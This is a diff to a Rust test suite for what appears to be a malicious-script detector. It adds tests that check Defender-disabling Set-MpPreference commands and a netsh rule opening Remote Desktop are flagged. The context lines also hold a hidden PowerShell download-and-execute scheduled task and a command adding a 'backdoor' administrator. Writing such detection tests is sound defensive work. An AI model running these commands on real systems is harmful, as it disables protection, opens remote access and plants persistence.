@@ -2692,6 +2692,27 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn set_mppreference_disable_named_argument_forms_emit_defender_evasion_traits() {
+        let script = br#"powershell -Command "Set-MpPreference -DisableRealtimeMonitoring:$true -SubmitSamplesConsent=2"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for action in [
+            "setmp-disablerealtimemonitoring",
+            "setmp-submitsamplesconsent",
+        ] {
+            assert!(
+                report
+                    .traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::DefenderEvasion { action: existing_action, .. } if existing_action == action)),
+                "missing DefenderEvasion {action}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn defender_registry_tampering_emits_evasion_trait() {
         // `reg add ...\Windows Defender\... /v DisableX /d 1` — flips
         // Defender policy keys to disable real-time / anti-spyware /
@@ -3558,6 +3579,23 @@ C:\Users\Public\nt.tmp localgroup Administrators backdoor /ADD
                     if technique == "rdp-firewall-open" && command == expected
             )),
             "full remote access command was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn netsh_remote_desktop_firewall_group_enable_emits_remote_access_trait() {
+        let script = br#"netsh advfirewall firewall set rule group="remote desktop" new enable=yes
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-firewall-open" && target == "Remote Desktop"
+            )),
+            "missing Remote Desktop firewall group enablement: {:?}",
             report.traits
         );
     }
